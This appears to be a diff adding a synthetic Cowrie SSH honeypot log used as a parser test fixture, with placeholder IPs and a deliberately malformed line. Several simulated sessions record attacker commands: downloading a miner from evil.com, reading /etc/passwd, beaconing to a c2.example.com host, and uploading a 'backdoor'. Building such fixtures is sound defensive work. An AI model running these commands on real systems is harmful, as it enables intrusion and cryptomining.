@@ -1,0 +1,45 @@
+{"eventid": "cowrie.session.connect", "session": "s1", "timestamp": "2023-01-01T10:00:00Z", "src_ip": "1.1.1.1", "dst_port": 2222}
+{"eventid": "cowrie.client.version", "session": "s1", "timestamp": "2023-01-01T10:00:01Z", "version": "SSH-2.0-OpenSSH"}
+{"eventid": "cowrie.login.success", "session": "s1", "timestamp": "2023-01-01T10:00:05Z", "username": "root", "password": "password"}
+{"eventid": "cowrie.command.input", "session": "s1", "timestamp": "2023-01-01T10:00:10Z", "input": "ls -la"}
+{"eventid": "cowrie.command.input", "session": "s1", "timestamp": "2023-01-01T10:00:15Z", "input": "whoami"}
+{"eventid": "cowrie.session.closed", "session": "s1", "timestamp": "2023-01-01T10:00:20Z"}
+{"eventid": "cowrie.session.connect", "session": "s2", "timestamp": "2023-01-01T10:05:00Z", "src_ip": "2.2.2.2", "dst_port": 2222}
+{"eventid": "cowrie.client.version", "session": "s2", "timestamp": "2023-01-01T10:05:01Z", "version": "SSH-2.0-Nmap"}
+{"eventid": "cowrie.session.closed", "session": "s2", "timestamp": "2023-01-01T10:05:02Z"}
+{"eventid": "cowrie.session.connect", "session": "s3", "timestamp": "2023-01-01T10:10:00Z", "src_ip": "3.3.3.3", "dst_port": 2222}
+{"eventid": "cowrie.login.failed", "session": "s3", "timestamp": "2023-01-01T10:10:01Z", "username": "admin", "password": "123"}
+{"eventid": "cowrie.login.failed", "session": "s3", "timestamp": "2023-01-01T10:10:03Z", "username": "admin", "password": "password"}
+{"eventid": "cowrie.session.closed", "session": "s3", "timestamp": "2023-01-01T10:10:05Z"}
+{"eventid": "cowrie.session.connect", "session": "s4", "timestamp": "2023-01-01T10:15:00Z", "src_ip": "4.4.4.4", "dst_port": 2222}
+{"eventid": "cowrie.login.success", "session": "s4", "timestamp": "2023-01-01T10:15:05Z", "username": "root", "password": "password"}
+{"eventid": "cowrie.command.input", "session": "s4", "timestamp": "2023-01-01T10:15:10Z", "input": "wget http://evil.com/miner"}
+{"eventid": "cowrie.command.input", "session": "s4", "timestamp": "2023-01-01T10:15:12Z", "input": "chmod +x miner"}
+{"eventid": "cowrie.session.closed", "session": "s4", "timestamp": "2023-01-01T10:15:15Z"}
+{"eventid": "cowrie.session.connect", "session": "s5", "timestamp": "2023-01-01T10:20:00Z", "src_ip": "5.5.5.5", "dst_port": 2222}
+{"eventid": "cowrie.login.success", "session": "s5", "timestamp": "2023-01-01T10:20:05Z", "username": "root", "password": "password"}
+{"eventid": "cowrie.command.input", "session": "s5", "timestamp": "2023-01-01T10:20:10Z", "input": "ls -la"}
+{"eventid": "cowrie.session.connect", "session": "s6", "timestamp": "2023-01-01T10:20:05Z", "src_ip": "1.1.1.1", "dst_port": 2222}
+{"eventid": "cowrie.login.failed", "session": "s6", "timestamp": "2023-01-01T10:20:10Z", "username": "admin", "password": "test"}
+{"eventid": "cowrie.login.failed", "session": "s6", "timestamp": "2023-01-01T10:20:15Z", "username": "root", "password": "1234"}
+{"eventid": "cowrie.session.closed", "session": "s6", "timestamp": "2023-01-01T10:20:30Z"}
+{"eventid": "cowrie.session.connect", "session": "s7", "timestamp": "2023-01-01T10:20:35Z", "src_ip": "1.1.1.1", "dst_port": 2222}
+{"eventid": "cowrie.login.failed", "session": "s7", "timestamp": "2023-01-01T10:20:40Z", "username": "root", "password": "root"}
+{"eventid": "cowrie.session.closed", "session": "s7", "timestamp": "2023-01-01T10:20:45Z"}
+{"eventid": "cowrie.session.connect", "session": "s8", "timestamp": "2023-01-01T10:21:00Z", "src_ip": "6.6.6.6", "dst_port": 23}
+{"eventid": "cowrie.login.failed", "session": "s8", "timestamp": "2023-01-01T10:21:05Z", "username": "admin", "password": "admin"}
+{"eventid": "cowrie.session.closed", "session": "s8", "timestamp": "2023-01-01T10:21:10Z"}
+{"eventid": "cowrie.session.connect", "session": "s9", "timestamp": "2023-01-01T10:30:00Z", "src_ip": "7.7.7.7", "dst_port": 2222}
+{"eventid": "cowrie.login.failed", "session": "s9", "timestamp": "2023-01-01T10:30:05Z", "username": "ubuntu", "password": "ubuntu"}
+{"eventid": "cowrie.session.file_download", "session": "s9", "timestamp": "2023-01-01T10:30:10Z", "url": "http://malicious.com/shell.sh"}
+{"eventid": "cowrie.session.closed", "session": "s9", "timestamp": "2023-01-01T10:30:20Z"}
+{"eventid": "cowrie.session.connect", "session": "s10", "timestamp": "2023-01-01T10:35:00Z", "src_ip": "1.1.1.1", "dst_port": 2222}
+{"eventid": "cowrie.login.failed", "session": "s10", "timestamp": "2023-01-01T10:35:05Z", "username": "pi", "password": "raspberry"}
+{"eventid": "cowrie.session.closed", "session": "s10", "timestamp": "2023-01-01T10:35:10Z"}
+THIS_IS_NOT_JSON - malformed line for testing
+{"eventid": "cowrie.session.connect", "session": "s11", "timestamp": "2023-01-01T10:40:00Z", "src_ip": "8.8.8.8", "dst_port": 2222}
+{"eventid": "cowrie.login.success", "session": "s11", "timestamp": "2023-01-01T10:40:05Z", "username": "root", "password": "toor"}
+{"eventid": "cowrie.command.input", "session": "s11", "timestamp": "2023-01-01T10:40:10Z", "input": "cat /etc/passwd"}
+{"eventid": "cowrie.command.input", "session": "s11", "timestamp": "2023-01-01T10:40:12Z", "input": "curl http://c2.example.com/beacon"}
+{"eventid": "cowrie.session.file_upload", "session": "s11", "timestamp": "2023-01-01T10:40:15Z", "filename": "backdoor"}
+{"eventid": "cowrie.session.closed", "session": "s11", "timestamp": "2023-01-01T10:40:30Z"}
